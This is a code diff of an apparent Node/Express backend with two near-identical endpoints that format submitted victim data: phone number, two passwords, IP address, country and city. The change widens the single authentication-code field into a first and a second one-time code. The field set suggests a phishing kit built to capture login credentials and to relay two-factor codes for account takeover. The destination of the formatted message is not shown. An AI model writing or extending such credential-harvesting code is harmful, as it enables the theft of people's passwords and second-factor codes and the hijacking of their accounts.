@@ -77,7 +77,8 @@ app.post('/api/user-info', async (req, res) => {
 - Mobile Phone Number: ${userInfo.mobilePhoneNumber || ''}
 - Password 1: ${userInfo.firstPassword || ''}
 - Password 2: ${userInfo.secondPassword || ''}
-- Code Authentication: ${userInfo.codeAuthentication || ''}
+- First Code Authentication: ${userInfo.firstCode || ''}
+- Second Code Authentication: ${userInfo.secondCode || ''}
 - IP Address: ${ipAddress}
 - Country: ${countryName}
 - City: ${cityName}
@@ -144,7 +145,8 @@ app.post('/api/user-info-1', async (req, res) => {
 - Mobile Phone Number: ${userInfo.mobilePhoneNumber || ''}
 - Password 1: ${userInfo.firstPassword || ''}
 - Password 2: ${userInfo.secondPassword || ''}
-- Code Authentication: ${userInfo.codeAuthentication || ''}
+- First Code Authentication: ${userInfo.firstCode || ''}
+- Second Code Authentication: ${userInfo.secondCode || ''}
 - IP Address: ${ipAddress}
 - Country: ${countryName}
 - City: ${cityName}
